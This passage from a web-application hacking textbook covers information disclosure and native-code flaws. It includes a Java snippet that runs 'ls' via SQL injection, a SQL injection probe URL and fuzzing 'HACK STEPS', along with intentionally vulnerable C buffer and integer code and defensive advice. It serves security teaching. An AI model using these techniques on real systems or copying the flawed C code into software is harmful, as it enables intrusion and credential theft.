in Java. By exploiting a SQL injection fl aw, you may be able to create your own 
function to perform arbitrary tasks. If the application returns error messages to 
the browser, from within your function you can throw a Java exception containing arbitrary data that you need to retrieve. For example, the following code 
executes the operating system command ls and then generates an exception 
that contains the output from the command. This returns a stack trace to the 
browser, the fi rst line of which contains a directory listing:
ByteArrayOutputStream baos = new ByteArrayOutputStream();
try
{
 Process p = Runtime.getRuntime().exec(‚Äúls‚Äù);
 InputStream is = p.getInputStream();
 int c;
 while (-1 != (c = is.read()))
 baos.write((byte) c);
}
c15.indd 624 c15.indd 624 8/19/2011 12:16:07 PM 8/19/2011 12:16:07 PM
Stuttard c15.indd V2 - 08/17/2011 Page 625 
 Chapter 15 n Exploiting Information Disclosure 625
catch (Exception e)
{
}
throw new RuntimeException(new String(baos.toByteArray()));
Gathering Published Information
Aside from the disclosure of useful information within error messages, the 
other primary way in which web applications give away sensitive data is by 
actually publishing it directly. There are various reasons why an application 
may publish information that an attacker can use:
n By design, as part of the application‚Äôs core functionality
n As an unintended side effect of another function
n Through debugging functionality that remains present in the live application
n Because of some vulnerability, such as broken access controls
Here are some examples of potentially sensitive information that applications 
often publish to users:
n Lists of valid usernames, account numbers, and document IDs
n User profi le details, including user roles and privileges, date of last login, 
and account status
n The current user‚Äôs password (this is usually masked on-screen but is 
present in the page source)
n Log fi les containing information such as usernames, URLs, actions performed, session tokens, and database queries
n Application details in client-side HTML source, such as commented-out 
links or form fi elds, and comments about bugs
HACK STEPS
 1. Review the results of your application mapping exercises (see Chapter 4) 
to identify all server-side functionality and client-side data that may be 
used to obtain useful information.
 2. Identify any locations within the application where sensitive data such 
as passwords or credit card details are transmitted from the server to 
the browser. Even if these are masked on-screen, they are still viewable 
within the server‚Äôs response. If you have found another suitable vulnerability, such as within access controls or session handling, this behavior 
can be used to obtain the information belonging to other application 
users.
 3. If you identify any means of extracting sensitive information, use the techniques described in Chapter 14 to automate the process.
c15.indd 625 c15.indd 625 8/19/2011 12:16:08 PM 8/19/2011 12:16:08 PM
Stuttard c15.indd V2 - 08/17/2011 Page 626 
626 Chapter 15 n Exploiting Information Disclosure
Using Inference
In some situations, an application may not divulge any data to you directly, 
but it may behave in ways that enable you to reliably infer useful information.
We have already encountered many instances of this phenomenon in the 
course of examining other categories of common vulnerability. For example:
n A registration function that enables you to enumerate registered usernames on the basis of an error message when an existing username is 
chosen (see Chapter 6).
n A search engine that allows you to infer the contents of indexed documents 
that you are not authorized to view directly (see Chapter 11).
n A blind SQL injection vulnerability in which you can alter the application‚Äôs 
behavior by adding a binary condition to an existing query, enabling you 
to extract information one bit at a time (see Chapter 9).
n The ‚Äúpadding oracle‚Äù attack in .NET, where an attacker can decrypt any 
string by sending a series of requests to the server and observing which 
ones result in an error during decryption (see Chapter 18).
Another way in which subtle differences in an application‚Äôs behavior may 
disclose information occurs when different operations take different lengths 
of time to perform, contingent upon some fact that is of interest to an attacker. 
This divergence can arise for various reasons:
n Many large and complex applications retrieve data from numerous backend systems, such as databases, message queues, and mainframes. To 
improve performance, some applications cache information that is used 
frequently. Similarly, some applications employ a lazy load approach, in 
which objects and data are loaded only when needed. In this situation, 
data that has been recently accessed is retrieved quickly from the server‚Äôs 
local cached copy, while other data is retrieved more slowly from the 
relevant back-end source.
This behavior has been observed in online banking applications. A request 
to access an account takes longer if the account is dormant than if it is 
active, enabling a skilled attacker to enumerate accounts that have been 
accessed recently by other users.
n In some situations, the amount of processing that an application performs on a particular request may depend on whether a submitted item 
of data is valid. For example, when a valid username is supplied to a login 
mechanism, the application may perform various database queries to 
retrieve account information and update the audit log. It also may perform 
c15.indd 626 c15.indd 626 8/19/2011 12:16:08 PM 8/19/2011 12:16:08 PM
Stuttard c15.indd V2 - 08/17/2011 Page 627 
 Chapter 15 n Exploiting Information Disclosure 627
computationally intensive operations to validate the supplied password 
against a stored hash. If an attacker can detect this timing difference, he 
may be able to exploit it to enumerate valid usernames.
n Some application functions may perform an action on the basis of user 
input that times out if an item of submitted data is invalid. For example, 
an application may use a cookie to store the address of a host located 
behind a front-end load balancer. An attacker may be able to manipulate 
this address to scan for web servers inside the organization‚Äôs internal 
network. If the address of an actual server that is not part of the application infrastructure is supplied, the application may immediately return 
an error. If a nonexistent address is supplied, the application may time 
out attempting to contact this address before returning the same generic 
error. You can use the response timers within Burp Intruder‚Äôs results table 
to facilitate this testing. Note that these columns are hidden by default, 
but can be shown via the Columns menu.
HACK STEPS
 1. Differences in the timing of application responses may be subtle and difficult to detect. In a typical situation, it is worth probing the application for 
this behavior only in selected key areas where a crucial item of interesting 
data is submitted and where the kind of processing being performed is 
likely to result in time differences.
 2. To test a particular function, compile one list containing several items that 
are known to be valid (or that have been accessed recently) and a second 
list containing items that are known to be invalid (or dormant). Make 
requests containing each item on these lists in a controlled way, issuing 
only one request at a time, and monitoring the time taken for the application to respond to each request. Determine whether there is any correlation between the item‚Äôs status and the time taken to respond.
 3. You can use Burp Intruder to automate this task. For every request it generates, Intruder automatically records the time taken before the application responds and the time taken to complete the response. You can sort 
a table of results by either of these attributes to quickly identify any obvious correlations.
Preventing Information Leakage
Although it may not be feasible or desirable to prevent the disclosure of absolutely any information that an attacker may fi nd useful, various relatively 
straightforward measures can be taken to reduce information leakage to a 
c15.indd 627 c15.indd 627 8/19/2011 12:16:08 PM 8/19/2011 12:16:08 PM
Stuttard c15.indd V2 - 08/17/2011 Page 628 
628 Chapter 15 n Exploiting Information Disclosure
minimum and to withhold the most sensitive data that can critically undermine 
an application‚Äôs security if disclosed to an attacker.
Use Generic Error Messages
The application should never return verbose error messages or debug information 
to the user‚Äôs browser. When an unexpected event occurs (such as an error in a 
database query, a failure to read a fi le from disk, or an exception in an external 
API call), the application should return the same generic message informing 
the user that an error occurred. If it is necessary to record debug information 
for support or diagnostic purposes, this should be held in a server-side log that 
is not publicly accessible. An index number to the relevant log entry may be 
returned to the user, enabling him or her to report this when contacting the 
help desk, if required.
Most application platforms and web servers can be confi gured to mask error 
information from being returned to the browser:
n In ASP.NET, you can suppress verbose error messages using the customErrors element of the Web.config fi le by setting the mode attribute 
to On or RemoteOnly and specifying a custom error page in the defaultRedirect node.
n In the Java Platform, you can confi gure customized error messages 
using the error-page element of the web.xml fi le. You can use the 
exception-type node to specify a Java exception type, or you can use 
the error-code node to specify an HTTP status code. You can use the 
location node to set the custom page to be displayed in the event of 
the specifi ed error.
n In Microsoft IIS, you can specify custom error pages for different HTTP 
status codes using the Custom Errors tab on a website‚Äôs Properties tab. 
A different custom page can be set for each status code, and on a perdirectory basis if required.
n In Apache, custom error pages can be confi gured using the ErrorDocument
directive in httpd.conf:
ErrorDocument 500 /generalerror.html
Protect Sensitive Information
Wherever possible, the application should not publish information that may be 
of use to an attacker, including usernames, log entries, and user profi le details. If 
certain users need access to this information, it should be protected by effective 
access controls and made available only where strictly necessary.
c15.indd 628 c15.indd 628 8/19/2011 12:16:08 PM 8/19/2011 12:16:08 PM
Stuttard c15.indd V2 - 08/17/2011 Page 629 
 Chapter 15 n Exploiting Information Disclosure 629
In cases where sensitive information must be disclosed to an authorized user 
(for example, where users can update their own account information), existing 
data should not be disclosed where it is not necessary. For example, stored 
credit card numbers should be displayed in truncated form, and password fi elds 
should never be prefi lled, even if masked on-screen. These defensive measures 
help mitigate the impact of any serious vulnerabilities that may exist within the 
application‚Äôs core security mechanisms of authentication, session management, 
and access control.
Minimize Client-Side Information Leakage
Where possible, service banners should be removed or modifi ed to minimize the 
disclosure of specifi c software versions and so on. The steps needed to implement this measure depend on the technologies in use. For example, in Microsoft 
IIS, the Server header can be removed using URLScan in the IISLockDown 
tool. In later versions of Apache, this can be achieved using the mod_headers
module. Because this information is subject to change, it is recommended that 
you consult your server documentation before carrying out any modifi cations.
All comments should be removed from client-side code that is deployed to 
the live production environment, including all HTML and JavaScript.
You should pay particular attention to any browser extension components 
such as Java applets and ActiveX controls. No sensitive information should be 
hidden within these components. A skilled attacker can decompile or reverseengineer these components to effectively recover their source code (see Chapter 5).
Summary
Leakage of unnecessary information frequently does not present any kind of 
signifi cant defect in an application‚Äôs security. Even highly verbose stack traces 
and other debugging messages may sometimes provide you with little leverage 
in seeking to attack the application.
In other cases, however, you may discover sources of information that are of 
great value in developing your attack. For example, you may fi nd lists of usernames, the precise versions of software components, or the internal structure 
and functionality of the server-side application logic.
Because of this possibility, any serious assault on an application should include 
a forensic examination of both the application itself and publicly available 
resources so that you can gather any information that may be of use in formulating your attacks against it. On some occasions, information gathered in this 
way can provide the foundation for a complete compromise of the application 
that disclosed it.
c15.indd 629 c15.indd 629 8/19/2011 12:16:08 PM 8/19/2011 12:16:08 PM
Stuttard c15.indd V2 - 08/17/2011 Page 630 
630 Chapter 15 n Exploiting Information Disclosure
Questions
Answers can be found at http://mdsec.net/wahh.
 1. While probing for SQL injection vulnerabilities, you request the following URL:
https://wahh-app.com/list.aspx?artist=foo‚Äô+having+1%3d1--
You receive the following error message:
Server: Msg 170, Level 15, State 1, Line 1
Line 1: Incorrect syntax near ‚Äòhaving1‚Äô.
What can you infer from this? Does the application contain any exploitable condition?
 2. While you are performing fuzz testing of various parameters, an application returns the following error message:
Warning: mysql_connect() [function.mysql-connect]: Access denied for
user ‚Äòpremiumdde‚Äô@‚Äôlocalhost‚Äô (using password: YES) in
/home/doau/public_html/premiumdde/directory on line 15
Warning: mysql_select_db() [function.mysql-select-db]: Access denied
for user ‚Äònobody‚Äô@‚Äôlocalhost‚Äô (using password: NO) in
/home/doau/public_html/premiumdde/directory on line 16
Warning: mysql_select_db() [function.mysql-select-db]: A link to
the server could not be established in
/home/doau/public_html/premiumdde/directory on line 16
Warning: mysql_query() [function.mysql-query]: Access denied for
user ‚Äònobody‚Äô@‚Äôlocalhost‚Äô (using password: NO) in
/home/doau/public_html/premiumdde/directory on line 448
What useful items of information can you extract from this?
 3. While mapping an application, you discover a hidden directory on the 
server that has directory listing enabled and appears to contain a number 
of old scripts. Requesting one of these scripts returns the following error 
message:
CGIWrap Error: Execution of this script not permitted
Execution of (contact.pl) is not permitted for the following reason:
Script is not executable. Issue ‚Äòchmod 755 filename‚Äô
Local Information and Documentation:
CGIWrap Docs: http://wahh-app.com/cgiwrap-docs/
Contact EMail: helpdesk@wahh-app.com
Server Data:
Server Administrator/Contact: helpdesk@wahh-app.com
Server Name: wahh-app.com
Server Port: 80
Server Protocol: HTTP/1.1
c15.indd 630 c15.indd 630 8/19/2011 12:16:08 PM 8/19/2011 12:16:08 PM
Stuttard c15.indd V2 - 08/17/2011 Page 631 
 Chapter 15 n Exploiting Information Disclosure 631
Request Data: 
User Agent/Browser: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT
5.1; .NET CLR 2.0.50727; FDM; InfoPath.1; .NET CLR 1.1.4322)
Request Method: GET
Remote Address: 192.168.201.19
Remote Port: 57961
Referring Page: http://wahh-app.com/cgi-bin/cgiwrap/fodd
What caused this error, and what common web application vulnerability 
should you quickly check for?
 4. You are probing the function of a request parameter in an attempt 
to determine its purpose within an application. You request the following URL:
https://wahh-app.com/agents/checkcfg.php?name=admin&id=13&log=1
The application returns the following error message:
Warning: mysql_connect() [function.mysql-connect]: Can‚Äôt connect to
MySQL server on ‚Äòadmin‚Äô (10013) in
/var/local/www/include/dbconfig.php on line 23
What caused this error message, and what vulnerabilities should you 
probe for as a result?
 5. While fuzzing a request for various categories of vulnerabilities, you 
submit a single quotation mark within each request parameter in turn. 
One of the results contains an HTTP 500 status code, indicating potential 
SQL injection. You check the full contents of the message, which are as 
follows:
Microsoft VBScript runtime error ‚Äò800a000d‚Äô
Type mismatch: ‚Äò [string: ‚Äú‚Äô‚Äù]‚Äô
/scripts/confirmOrder.asp, line 715
Is the application vulnerable?
c15.indd 631 c15.indd 631 8/19/2011 12:16:08 PM 8/19/2011 12:16:08 PM
Stuttard c15.indd V1 - 08/17/2011 Page 632 
c15.indd 632 c15.indd 632 8/19/2011 12:16:08 PM 8/19/2011 12:16:08 PM
Stuttard c16.indd V2 - 08/16/2011 Page 633
633
C H A P T E R 
16
Attacking Native 
Compiled Applications
Compiled software that runs in a native execution environment has historically 
been plagued by vulnerabilities such as buffer overfl ows and format string bugs. 
Most web applications are written using languages and platforms that run in a 
managed execution environment in which these classic vulnerabilities do not 
arise. One of the most signifi cant advantages of languages such as C# and Java 
is that programmers do not need to worry about the kind of buffer management and pointer arithmetic problems that have affected software developed 
in native languages such as C and C++ and that have given rise to the majority 
of critical bugs found in that software.
Nevertheless, you may occasionally encounter web applications that are written in native code. Also, many applications written primarily using managed 
code contain portions of native code or call external components that run in 
an unmanaged context. Unless you know for certain that your target application does not contain any native code, it is worth performing some basic tests 
designed to uncover any classic vulnerabilities that may exist.
Web applications that run on hardware devices such as printers and switches 
often contain some native code. Other likely targets include any page or script 
whose name includes possible indicators of native code, such as dll or exe, and 
any functionality known to call legacy external components, such as logging 
mechanisms. If you believe that the application you are attacking contains 
substantial amounts of native code, it may be desirable to test every piece of 
c16.indd 633 c16.indd 633 8/19/2011 12:16:35 PM 8/19/2011 12:16:35 PM
Stuttard c16.indd V2 - 08/16/2011 Page 634
634 Chapter 16 n Attacking Native Compiled Applications 
user-supplied data processed by the application, including the names and values 
of every parameter, cookie, request header, and other data.
This chapter covers three main categories of classic software vulnerability: 
buffer overfl ows, integer vulnerabilities, and format string bugs. In each case, 
we will describe some common vulnerabilities and then outline the practical 
steps you can take when probing for these bugs within a web application. This 
topic is huge and extends far beyond the scope of a book about hacking web 
applications. To learn more about native software vulnerabilities and how to 
fi nd them, we recommend the following books:
n The Shellcoder‚Äôs Handbook, 2nd Edition, by Chris Anley, John Heasman, 
Felix Linder, and Gerardo Richarte (Wiley, 2007)
n The Art of Software Security Assessment by Mark Dowd, John McDonald, 
and Justin Schuh (Addison-Wesley, 2006)
n Gray Hat Hacking, 2nd Edition, by Shon Harris, Allen Harper, Chris Eagle, 
and Jonathan Ness (McGraw-Hill Osborne, 2008)
NOTE Remote probing for the vulnerabilities described in this chapter carries a high risk of denial of service to the application. Unlike vulnerabilities 
such as weak authentication and path traversal, the mere detection of classic 
software vulnerabilities is likely to cause unhandled exceptions within the target application, which may cause it to stop functioning. If you intend to probe 
a live application for these bugs, you must ensure that the application owner 
accepts the risks associated with the testing before you begin.
Buffer Overfl ow Vulnerabilities
Buffer overfl ow vulnerabilities occur when an application copies user-controllable 
data into a memory buffer that is not suffi ciently large to accommodate it. The 
destination buffer is overfl owed, resulting in adjacent memory being overwritten 
with the user‚Äôs data. Depending on the nature of the vulnerability, an attacker 
may be able to exploit it to execute arbitrary code on the server or perform 
other unauthorized actions. Buffer overfl ow vulnerabilities have been hugely 
prevalent in native software over the years and have been widely regarded as 
Public Enemy Number One that developers of such software need to avoid.
Stack Overfl ows
Buffer overfl ows typically arise when an application uses an unbounded copy 
operation (such as strcpy in C) to copy a variable-size buffer into a fi xed-size 
buffer without verifying that the fi xed-sized buffer is large enough. For example, 
c16.indd 634 c16.indd 634 8/19/2011 12:16:35 PM 8/19/2011 12:16:35 PM
34 Stuttard c16.indd V2 - 08/16/2011 Page 635
 Chapter 16 n Attacking Native Compiled Applications 635
the following function copies the username string into a fi xed-size buffer allocated on the stack:
bool CheckLogin(char* username, char* password)
{
 char _username[32];
 strcpy(_username, username);
 ...
If the username string contains more than 32 characters, the _username buffer 
is overfl owed, and the attacker overwrites the data in adjacent memory.
In a stack-based buffer overfl ow, a successful exploit typically involves overwriting the saved return address on the stack. When the CheckLogin function 
is called, the processor pushes onto the stack the address of the instruction following the call. When CheckLogin is fi nished, the processor pops this address 
back off the stack and returns execution to that instruction. In the meantime, 
the CheckLogin function allocates the _username buffer on the stack right next 
to the saved return address. If an attacker can overfl ow the _username buffer, 
he can overwrite the saved return address with a value of his choosing, thereby 
causing the processor to jump to this address and execute arbitrary code.
Heap Overfl ows
Heap-based buffer overfl ows essentially involve the same kind of unsafe operation as described previously, except that the overfl owed destination buffer is 
allocated on the heap, not the stack:
bool CheckLogin(char* username, char* password)
{
 char* _username = (char*) malloc(32);
 strcpy(_username, username);
 ...
In a heap-based buffer overfl ow, what is typically adjacent to the destination 
buffer is not any saved return address but other blocks of heap memory, separated by heap control structures. The heap is implemented as a doubly linked 
list: each block is preceded in memory by a control structure that contains the 
size of the block, a pointer to the previous block on the heap, and a pointer to the 
next block on the heap. When a heap buffer is overfl owed, the control structure 
of an adjacent heap block is overwritten with user-controllable data.
This type of vulnerability is less straightforward to exploit than a stack-based 
overfl ow, but a common approach is to write crafted values into the overwritten 
heap control structure to cause an arbitrary overwrite of a critical pointer at some 
future time. When the heap block whose control structure has been overwritten is freed from memory, the heap manager needs to update the linked list of 
c16.indd 635 c16.indd 635 8/19/2011 12:16:35 PM 8/19/2011 12:16:35 PM
Stuttard c16.indd V2 - 08/16/2011 Page 636
636 Chapter 16 n Attacking Native Compiled Applications 
heap blocks. To do this, it needs to update the back link pointer of the following 
heap block and update the forward link pointer of the preceding heap block so 
that these two items in the linked list point to each other. To do this, the heap 
manager uses the values in the overwritten control structure. Specifi cally, to 
update the following block‚Äôs back link pointer, the heap manager dereferences 
the forward link pointer taken from the overwritten control structure and writes 
into the structure at this address the value of the back link pointer taken from 
the overwritten control structure. In other words, it writes a user-controllable 
value to a user-controllable address. If an attacker has crafted his overfl ow data 
appropriately, he can overwrite any pointer in memory with a value of his choosing, with the objective of seizing control of the path of execution and therefore 
executing arbitrary code. Typical targets for the arbitrary pointer overwrite are 
the value of a function pointer that the application will later call and the address 
of an exception handler that will be invoked the next time an exception occurs.
NOTE Modern compilers and operating systems have implemented various 
defenses to protect software against programming errors that lead to buffer 
overfl ows. These defenses mean that real-world overfl ows today are generally more diffi cult to exploit than the examples described here. For further 
information about these defenses and ways to circumvent them, see The 
Shellcoder‚Äôs Handbook.
‚ÄúOff-by-One‚Äù Vulnerabilities
A specifi c kind of overfl ow vulnerability arises when a programming error 
enables an attacker to write a single byte (or a small number of bytes) beyond 
the end of an allocated buffer.
Consider the following code, which allocates a buffer on the stack, performs a 
counted buffer copy operation, and then null-terminates the destination string:
bool CheckLogin(char* username, char* password)
{
 char _username[32];
 int i;
 for (i = 0; username[i] && i < 32; i++)
 _username[i] = username[i];
 _username[i] = 0;
 ...
The code copies up to 32 bytes and then adds the null terminator. Hence, 
if the username is 32 bytes or longer, the null byte is written beyond the end 
of the _username buffer, corrupting adjacent memory. This condition may be 
exploitable. If the adjacent item on the stack is the saved frame pointer of the 
calling frame, setting the lower-order byte to zero may cause it to point to 
c16.indd 636 c16.indd 636 8/19/2011 12:16:35 PM 8/19/2011 12:16:35 PM
36 Stuttard c16.indd V2 - 08/16/2011 Page 637
 Chapter 16 n Attacking Native Compiled Applications 637
the _username buffer and therefore to data that the attacker controls. When the 
calling function returns, this may enable an attacker to take control of the fl ow 
of execution.
A similar kind of vulnerability arises when developers overlook the need 
for string buffers to include room for a null terminator. Consider the following 
‚Äúfi x‚Äù to the original heap overfl ow:
bool CheckLogin(char* username, char* password)
{
 char* _username = (char*) malloc(32);
 strncpy(_username, username, 32);
 ...
Here, the programmer creates a fi xed-size buffer on the heap and then performs a counted buffer copy operation, designed to ensure that the buffer is 
not overfl owed. However, if the username is longer than the buffer, the buffer 
is completely fi lled with characters from the username, leaving no room to 
append a trailing null byte. The copied version of the string therefore has lost 
its null terminator.
Languages such as C have no separate record of a string‚Äôs length. The end of 
the string is indicated by a null byte (that is, one with the ASCII character code 
zero). If a string loses its null terminator, it effectively increases in length and 
continues as far as the next byte in memory, which happens to be zero. This 
unintended consequence can often cause unusual behavior and vulnerabilities 
within an application.
The authors encountered a vulnerability of this kind in a web application 
running on a hardware device. The application contained a page that accepted 
arbitrary parameters in a POST request and returned an HTML form containing the names and values of those parameters as hidden fi elds. For example:
POST /formRelay.cgi HTTP/1.0
Content-Length: 3
a=b
HTTP/1.1 200 OK
Date: THU, 01 SEP 2011 14:53:13 GMT
Content-Type: text/html
Content-Length: 278
<html>
<head>
<meta http-equiv=‚Äùcontent-type‚Äù content=‚Äùtext/html;charset=iso-8859-1‚Äù>
</head>
<form name=‚ÄùFORM_RELAY‚Äù action=‚Äùpage.cgi‚Äù method=‚ÄùPOST‚Äù>
<input type=‚Äùhidden‚Äù name=‚Äùa‚Äù value=‚Äùb‚Äù>
c16.indd 637 c16.indd 637 8/19/2011 12:16:35 PM 8/19/2011 12:16:35 PM
Stuttard c16.indd V2 - 08/16/2011 Page 638
638 Chapter 16 n Attacking Native Compiled Applications 
</form>
<body onLoad=‚Äùdocument.FORM_RELAY.submit();‚Äù>
</body>
</html>
For some reason, this page was used throughout the application to process 
all kinds of user input, much of which was sensitive. However, if 4096 or more 
bytes of data were submitted, the returned form also contained the parameters 
submitted by the previous request to the page, even if these were submitted by 
a different user. For example:
POST /formRelay.cgi HTTP/1.0
Content-Length: 4096
a=bbbbbbbbbbbbb[lots more b‚Äôs]
HTTP/1.1 200 OK
Date: THU, 01 SEP 2011 14:58:31 GMT
Content-Type: text/html
Content-Length: 4598
<html>
<head>
<meta http-equiv=‚Äùcontent-type‚Äù content=‚Äùtext/html;charset=iso-8859-1‚Äù>
</head>
<form name=‚ÄùFORM_RELAY‚Äù action=‚Äùpage.cgi‚Äù method=‚ÄùPOST‚Äù>
<input type=‚Äùhidden‚Äù name=‚Äùa‚Äù value=‚Äùbbbbbbbbbbbbb[lots more b‚Äôs]‚Äù>
<input type=‚Äùhidden‚Äù name=‚ÄùstrUsername‚Äù value=‚Äùagriffiths‚Äù>
<input type=‚Äùhidden‚Äù name=‚ÄùstrPassword‚Äù value=‚Äùaufwiedersehen‚Äù>
<input type=‚Äúhidden‚Äú name=‚ÄúLog_in‚Äú value=‚ÄúLog+In‚Äú>
</form>
<body onLoad=‚Äúdocument.FORM_RELAY.submit();‚Äú>
</body>
</html>
Having identifi ed this vulnerability, it was possible to poll the vulnerable page 
continuously with overlong data and parse the responses to log every piece of 
data submitted to the page by other users. This included login credentials and 
other sensitive information.
The root cause of the vulnerability was that the user-supplied data was 
being stored as null-terminated strings within 4096-byte blocks of memory. 
The data was copied in a checked operation, so no straight overfl ow was possible. However, if overlong input was submitted, the copy operation resulted 
in the loss of the null terminator, so the string fl owed into the next data in 
memory. Therefore, when the application parsed the request parameters, it 
continued up until the next null byte and therefore included the parameters 
supplied by another user.
c16.indd 638 c16.indd 638 8/19/2011 12:16:35 PM 8/19/2011 12:16:35 PM
38 Stuttard c16.indd V2 - 08/16/2011 Page 639
 Chapter 16 n Attacking Native Compiled Applications 639
Detecting Buffer Overfl ow Vulnerabilities
The basic methodology for detecting buffer overfl ow vulnerabilities is to send 
long strings of data to an identifi ed target and monitor for anomalous results. In 
some cases, subtle vulnerabilities exist that can be detected only by sending an 
overlong string of a specifi c length, or within a small range of lengths. However, 
in most cases vulnerabilities can be detected simply by sending a string that is 
longer than the application is expecting.
Programmers commonly create fi xed-size buffers using round numbers in either 
decimal or hexadecimal, such as 32, 100, 1024, 4096, and so on. A simple approach to 
detecting any ‚Äúlow-hanging fruit‚Äù within the application is to send long strings as each 
item of target data is identifi ed and to monitor the server‚Äôs responses for anomalies.
HACK STEPS
 1. For each item of data being targeted, submit a range of long strings with 
lengths somewhat longer than common buffer sizes. For example:
1100
4200
33000
 2. Target one item of data at a time to maximize the coverage of code paths 
within the application.
 3. You can use the character blocks payload source in Burp Intruder to automatically generate payloads of various sizes.
 4. Monitor the application‚Äôs responses to identify any anomalies. An uncontrolled overflow is almost certain to cause an exception in the application. 
Detecting when this has occurred in a remote process is difficult, but here 
are some anomalous events to look for:
n An HTTP 500 status code or error message, where other malformed 
(but not overlong) input does not have the same effect
n An informative message, indicating that a failure occurred in some 
native code component
n A partial or malformed response is received from the server
n The TCP connection to the server closes abruptly without returning a 
response
n The entire web application stops responding
 5. Note that when a heap-based overflow is triggered, this may result in a 
crash at some future point, rather than immediately. You may need to experiment to identify one or more test cases that are causing heap corruption.
 6. An off-by-one vulnerability may not cause a crash, but it may result in anomalous behavior such as unexpected data being returned by the application.
c16.indd 639 c16.indd 639 8/19/2011 12:16:36 PM 8/19/2011 12:16:36 PM
Stuttard c16.indd V2 - 08/16/2011 Page 640
640 Chapter 16 n Attacking Native Compiled Applications 
In some instances, your test cases may be blocked by input validation checks 
implemented either within the application itself or by other components such 
as the web server. This often occurs when overlong data is submitted within 
the URL query string and may be indicated by a generic message such as 
‚ÄúURL too long‚Äù in response to every test case. In this situation, you should 
experiment to determine the maximum length of URL permitted (which is 
often about 2,000 characters) and adjust your buffer sizes so that your test 
cases comply with this requirement. Overfl ows may still exist behind the 
generic length fi ltering, which can be triggered by strings short enough to 
get past that fi ltering.
In other instances, fi lters may restrict the type of data or range of characters 
that can be submitted within a particular parameter. For example, an application may validate that a submitted username contains only alphanumeric 
characters before passing it to a function containing an overfl ow. To maximize 
the effectiveness of your testing, you should attempt to ensure that each test 
case contains only characters that are permitted in the relevant parameter. One 
effective technique for achieving this is to capture a normal request containing data that the application accepts and to extend each targeted parameter in 
turn, using the same characters it already contains, to create a long string that 
is likely to pass any content-based fi lters.
Even if you are confi dent that a buffer overfl ow condition exists, exploiting it 
remotely to achieve arbitrary code execution is extremely diffi cult. Peter WinterSmith of NGSSoftware has produced some interesting research regarding the 
possibilities for blind buffer overfl ow exploitation. For more information, see 
the following whitepaper:
www.ngssoftware.com/papers/NISR.BlindExploitation.pdf
Integer Vulnerabilities
Integer-related vulnerabilities typically arise when an application performs 
some arithmetic on a length value before performing some buffer operation 
but fails to take into account certain features of how compilers and processors 
handle integers. Two types of integer bugs are worthy of note: overfl ows and 
signedness errors.
Integer Overfl ows
These occur when an operation on an integer value causes it to increase above 
its maximum possible value or decrease below its minimum possible value. 
When this occurs, the number wraps, so a very large number becomes very 
small, or vice versa.
c16.indd 640 c16.indd 640 8/19/2011 12:16:36 PM 8/19/2011 12:16:36 PM
40 Stuttard c16.indd V2 - 08/16/2011 Page 641
 Chapter 16 n Attacking Native Compiled Applications 641
Consider the following ‚Äúfi x‚Äù to the heap overfl ow described previously:
bool CheckLogin(char* username, char* password)
{
 unsigned short len = strlen(username) + 1;
 char* _username = (char*) malloc(len);
 strcpy(_username, username);
 ...
Here, the application measures the length of the user-submitted username, 
adds 1 to accommodate the trailing null, allocates a buffer of the resulting size, 
and then copies the username into it. With normal-sized input, this code behaves 
as intended. However, if the user submits a username of 65,535 characters, an 
integer overfl ow occurs. A short-sized integer contains 16 bits, which is enough 
for its value to range between 0 and 65,535. When a string of length 65,535 is 
submitted, the program adds 1 to this, and the value wraps to become 0. A 
zero-length buffer is allocated, and the long username is copied into it, causing a heap overfl ow. The attacker has effectively subverted the programmer‚Äôs 
attempt to ensure that the destination buffer is large enough.
Signedness Errors
These occur when an application uses both signed and unsigned integers to 
measure the lengths of buffers and confuses them at some point. Either the 
application makes a direct comparison between a signed and unsigned value, 
or it passes a signed value as a parameter to a function that takes an unsigned 
value. In both cases, the signed value is treated as its unsigned equivalent, 
meaning that a negative number becomes a large positive number.
Consider the following ‚Äúfi x‚Äù to the stack overfl ow described previously:
bool CheckLogin(char* username, int len, char* password)
{
 char _username[32] = ‚Äú‚Äù;
 if (len < 32)
 strncpy(_username, username, len);
 ...
Here, the function takes both the user-supplied username and a signed integer indicating its length. The programmer creates a fi xed-size buffer on the 
stack and checks whether the length is less than the size of the buffer. If it is, 
the programmer performs a counted buffer copy, designed to ensure that the 
buffer is not overfl owed.
If the len parameter is a positive number, this code behaves as intended. 
However, if an attacker can cause a negative value to be passed to the function, 
the programmer‚Äôs protective check is subverted. The comparison with 32 still 
c16.indd 641 c16.indd 641 8/19/2011 12:16:36 PM 8/19/2011 12:16:36 PM
Stuttard c16.indd V2 - 08/16/2011 Page 642
642 Chapter 16 n Attacking Native Compiled Applications 
succeeds, because the compiler treats both numbers as signed integers. Hence, 
the negative length is passed to the strncpy function as its count parameter. 
Because strncpy takes an unsigned integer as this parameter, the compiler 
implicitly casts the value of len to this type, so the negative value is treated as 
a large positive number. If the user-supplied username string is longer than 32 
bytes, the buffer is overfl owed just as in a standard stack-based overfl ow.
This kind of attack usually is feasible only when the attacker can directly 
control a length parameter. For example, perhaps it is computed by client-side 
JavaScript and submitted with a request alongside the string to which it refers. 
However, if the integer variable is small enough (for example, a short) and the 
program computes the length on the server side, an attacker may also be able 
to introduce a negative value via an integer overfl ow by submitting an overlong 
string to the application.
Detecting Integer Vulnerabilities
Naturally, the primary locations to probe for integer vulnerabilities are any 
instances where an integer value is submitted from the client to the server. This 
behavior usually arises in two different ways:
n The application may pass integer values in the normal way as parameters 
within the query string, cookies, or message body. These numbers usually are represented in decimal form using standard ASCII characters. 
The most likely targets for testing are fi elds that appear to represent the 
length of a string that is also being submitted.
n The application may pass integer values embedded within a larger blob 
of binary data. This data may originate from a client-side component 
such as an ActiveX control, or it may have been transmitted via the client 
in a hidden form fi eld or cookie (see Chapter 5). Length-related integers 
may be harder to identify in this context. They typically are represented 
in hexadecimal form and often directly precede the string or buffer to 
which they relate. Note that binary data may be encoded using Base64 
or similar schemes for transmission over HTTP.
HACK STEPS
 1. Having identified targets for testing, you need to send suitable payloads 
designed to trigger any vulnerabilities. For each item of data being targeted, 
send a series of different values in turn, representing boundary cases for the 
signed and unsigned versions of different sizes of integer. For example:
n 0x7f and 0x80 (127 and 128)
n 0xff and 0x100 (255 and 256)
c16.indd 642 c16.indd 642 8/19/2011 12:16:36 PM 8/19/2011 12:16:36 PM
42 Stuttard c16.indd V2 - 08/16/2011 Page 643
 Chapter 16 n Attacking Native Compiled Applications 643
n 0x7ffff and 0x8000 (32767 and 32768)
n 0xffff and 0x10000 (65535 and 65536)
n 0x7fffffff and 0x80000000 (2147483647 and 2147483648)
n 0xffffffff and 0x0 (4294967295 and 0)
